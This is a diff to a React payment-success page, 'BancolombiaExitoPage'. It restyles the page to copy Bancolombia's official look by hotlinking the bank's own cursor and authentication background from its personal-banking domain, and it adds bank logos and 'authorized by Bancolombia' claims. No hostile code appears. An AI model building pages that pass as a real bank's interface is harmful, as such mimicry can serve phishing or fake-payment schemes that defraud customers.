@@ -69,94 +69,123 @@ export default function BancolombiaExitoPage() {
   };
 
   return (
-    <div className="min-h-screen bg-[#004B87] flex items-center justify-center p-4">
-      <div className="max-w-md w-full">
-        {/* Header */}
-        <div className="text-center mb-8">
-          <div className="bg-white rounded-full w-20 h-20 mx-auto mb-4 flex items-center justify-center">
+    <div 
+      className="min-h-screen relative"
+      style={{
+        fontFamily: '"Open Sans", Arial, sans-serif',
+        cursor: 'url("https://svpersonas.apps.bancolombia.com/assets/images/light-cursor-small.png"), auto'
+      }}
+    >
+      {/* Official Bancolombia background */}
+      <div 
+        className="min-h-screen bg-no-repeat bg-center bg-cover flex items-center justify-center"
+        style={{
+          backgroundImage: 'url("https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg")',
+        }}
+      >
+        
+        {/* Top Header */}
+        <div className="absolute top-0 left-0 right-0 bg-white border-b border-gray-200 py-3">
+          <div className="max-w-7xl mx-auto px-4 flex justify-center items-center">
             <img 
-              src="/logos/bancos/bancolombia.png" 
+              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
               alt="Bancolombia" 
-              className="w-14 h-14 object-contain"
+              className="h-6"
             />
           </div>
-          <h1 className="text-white text-2xl font-bold mb-2">Bancolombia</h1>
-          <p className="text-blue-200">Transacción Completada</p>
         </div>
 
-        {/* Success Card */}
-        <div className="bg-white rounded-xl shadow-2xl p-8">
-          <div className="text-center mb-6">
-            <div className="bg-green-100 rounded-full w-20 h-20 mx-auto mb-4 flex items-center justify-center">
-              <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
-              </svg>
+        {/* Main Content */}
+        <div className="w-full max-w-md mx-auto px-4">
+          <div className="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden">
+            
+            {/* Success Icon & Title */}
+            <div className="text-center py-10 px-8 bg-gradient-to-b from-green-50 to-white">
+              <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
+                </svg>
+              </div>
+              <h2 className="text-3xl font-bold text-gray-900 mb-3">¡Pago Exitoso!</h2>
+              <p className="text-gray-600 text-base">
+                Tu transacción ha sido procesada correctamente
+              </p>
             </div>
-            <h2 className="text-2xl font-bold text-gray-800 mb-2">¡Pago Exitoso!</h2>
-            <p className="text-gray-600">Tu transacción ha sido procesada correctamente</p>
-          </div>
 
-          {orderDetails && (
-            <div className="space-y-4 mb-6">
-              <div className="bg-gray-50 rounded-lg p-4">
-                <div className="flex justify-between items-center mb-2">
-                  <span className="text-sm text-gray-600">Monto pagado:</span>
-                  <span className="font-semibold text-lg text-green-600">
-                    {formatCurrency(orderDetails.orderData.totalAmount)}
-                  </span>
+            {/* Transaction Details */}
+            {orderDetails && (
+              <div className="px-8 py-6 space-y-4">
+                <div className="bg-gray-50 rounded-xl p-5">
+                  <div className="flex justify-between items-center mb-4 pb-4 border-b border-gray-200">
+                    <span className="text-gray-600 font-medium">Monto pagado:</span>
+                    <span className="font-bold text-2xl text-green-600">
+                      {formatCurrency(orderDetails.orderData.totalAmount)}
+                    </span>
+                  </div>
+                  <div className="space-y-3">
+                    <div className="flex justify-between items-center">
+                      <span className="text-sm text-gray-500">Cliente:</span>
+                      <span className="font-medium text-gray-800 text-sm">
+                        {orderDetails.customerData.fullName}
+                      </span>
+                    </div>
+                    <div className="flex justify-between items-center">
+                      <span className="text-sm text-gray-500">Email:</span>
+                      <span className="font-medium text-gray-800 text-sm uppercase">
+                        {orderDetails.customerData.email}
+                      </span>
+                    </div>
+                  </div>
                 </div>
-                <div className="flex justify-between items-center mb-2">
-                  <span className="text-sm text-gray-600">Cliente:</span>
-                  <span className="font-medium text-gray-800">
-                    {orderDetails.customerData.fullName}
-                  </span>
-                </div>
-                <div className="flex justify-between items-center">
-                  <span className="text-sm text-gray-600">Email:</span>
-                  <span className="font-medium text-gray-800">
-                    {orderDetails.customerData.email}
-                  </span>
+
+                <div className="bg-blue-50 rounded-xl p-4 border border-blue-100">
+                  <div className="flex items-center justify-center space-x-2 text-blue-700">
+                    <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                      <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+                    </svg>
+                    <span className="text-sm font-semibold">
+                      Transacción autorizada por Bancolombia
+                    </span>
+                  </div>
                 </div>
               </div>
+            )}
 
-              <div className="bg-blue-50 rounded-lg p-4">
-                <div className="flex items-center justify-center space-x-2 text-[#004B87]">
-                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
-                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-8.293l-3-3a1 1 0 00-1.414 1.414L10.586 9.5H7a1 1 0 100 2h3.586l-1.293 1.293a1 1 0 101.414 1.414l3-3a1 1 0 000-1.414z" clipRule="evenodd" />
-                  </svg>
-                  <span className="text-sm font-medium">
-                    Transacción autorizada por Bancolombia
-                  </span>
-                </div>
+            {/* Action Button */}
+            <div className="px-8 pb-8">
+              <button
+                onClick={handleGoHome}
+                className="w-full py-4 bg-[#004B87] text-white rounded-xl hover:bg-[#003666] transition font-semibold text-lg shadow-lg"
+              >
+                Volver al inicio
+              </button>
+            </div>
+
+            {/* Security Badge */}
+            <div className="px-8 pb-6 text-center">
+              <div className="flex items-center justify-center space-x-2 text-green-600">
+                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
+                </svg>
+                <span className="text-sm font-medium">Pago procesado de forma segura</span>
               </div>
             </div>
-          )}
-
-          <button
-            onClick={handleGoHome}
-            className="w-full py-3 px-6 bg-[#004B87] text-white rounded-lg hover:bg-[#003666] transition font-medium"
-          >
-            Volver al inicio
-          </button>
-
-          <div className="mt-6 text-center">
-            <div className="flex items-center justify-center space-x-2 text-green-600">
-              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
-                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
-              </svg>
-              <span className="text-sm font-medium">Pago procesado de forma segura</span>
-            </div>
           </div>
-        </div>
 
-        {/* Footer Info */}
-        <div className="text-center mt-6">
-          <p className="text-blue-200 text-sm">
-            Recibirás un email de confirmación en los próximos minutos
-          </p>
-          <p className="text-blue-300 text-xs mt-2">
-            Referencia: {sessionId.slice(-8).toUpperCase()}
-          </p>
+          {/* Footer Info */}
+          <div className="text-center mt-6 space-y-2">
+            <p className="text-gray-700 text-sm font-medium">
+              Recibirás un email de confirmación en los próximos minutos
+            </p>
+            <p className="text-gray-500 text-xs">
+              Referencia: {sessionId.slice(-8).toUpperCase()}
+            </p>
+            <img 
+              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
+              alt="Bancolombia" 
+              className="h-5 mx-auto opacity-60 mt-4"
+            />
+          </div>
         </div>
       </div>
     </div>
